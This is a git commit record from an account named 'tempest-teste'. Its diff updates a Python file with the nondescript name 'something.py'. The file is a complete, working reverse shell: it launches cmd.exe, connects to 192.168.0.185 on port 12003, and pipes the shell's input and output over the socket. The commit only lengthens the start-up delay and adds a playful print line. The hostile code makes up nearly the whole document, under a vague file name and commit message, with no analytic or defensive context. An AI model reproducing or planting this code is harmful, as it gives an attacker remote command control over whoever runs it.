c1077b477f65c70fe80d3b9fa6ecb97d5861bca6
tempest-teste <134532044+tempest-teste@users.noreply.github.com>
2023-07-10 14:51:01 -0300

    Update something.py

--- something.py
+++ something.py
@@ -1,6 +1,7 @@
 import socket,os,threading,time,subprocess as sp;
-time.sleep(5)
+time.sleep(15)
 p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);
 s=socket.socket();
 s.connect(('192.168.0.185',12003));
+print("fun interactive stuff")
 threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start();threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
